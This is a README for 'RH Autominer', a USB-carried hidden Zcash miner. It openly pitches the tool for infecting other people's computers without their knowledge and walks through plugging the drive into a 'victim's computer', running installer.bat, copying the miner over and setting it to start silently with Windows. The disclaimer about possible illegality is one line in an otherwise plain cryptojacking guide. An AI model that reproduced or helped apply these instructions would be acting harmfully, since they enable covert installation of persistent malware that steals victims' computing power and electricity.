# RH-Autominer
RH Autominer v1.0

The RH Autominer is meant to be put on a usb drive so you can quickly start a mining operation
on a new computer or just infect someone else’s computer to mine for you in the background, without them knowing. 
Currently RH Autominer 1.0 only supports equihash coins, such as Zcash witch is preinstalled.
RH Autominer v2.0 will support ethash coins in the future.

###### WARNING
Use on your own risk. 
It could be illegal to run this script on someone’s computer without them knowing.
How to turn of the script: 
Since it is a silent miner, the miner won’t run in a normal window, so you can’t just close the window to shut the miner down.
To shut down the miner, open task manger, navigate to processes and search for “miner.exe” or “miner”.
When you have found it, it’s just to mark it and click on “End task”.

# What the installer does:
When the usb drive is inserted to a new computer nothing will happen until you start “installer.bat”.
When “installer.bat” is executed, it will copy the script form the usb drive to the victim’s documents folder on the C drive.
After that it will setup the “start with windows” function and run the script.

# How to setup the Autominer:
1. Change the miner settings to your liking.
To change the setting, edit "config.bat" in "RH Autominer" folder.
For more help with the miner please refer to the "Help" document.

2. When you are done with the miner setup, copy the "RH Autominer" folder and "installer.bat" to a usb drive.
You don't need the .txt files, but you can copy them too. It's important to do this right otherwise the script won't work.
The files must be in the first directory of the usb drive, not in a folder on the usb.
It should look something like this: "F:\RH Autominer" and "F:\installer.bat"
The “F:\” is just an example, it doesn’t matter what letter the usb drive has.

3. Plug the usb in to the victim’s computer and run installer.bat.
It will now copy itself to the victim’s computer and start running. It takes less than 30 seconds.

4. When the console says the install has completed and the script is running, you can eject the usb drive from the computer.
All done.
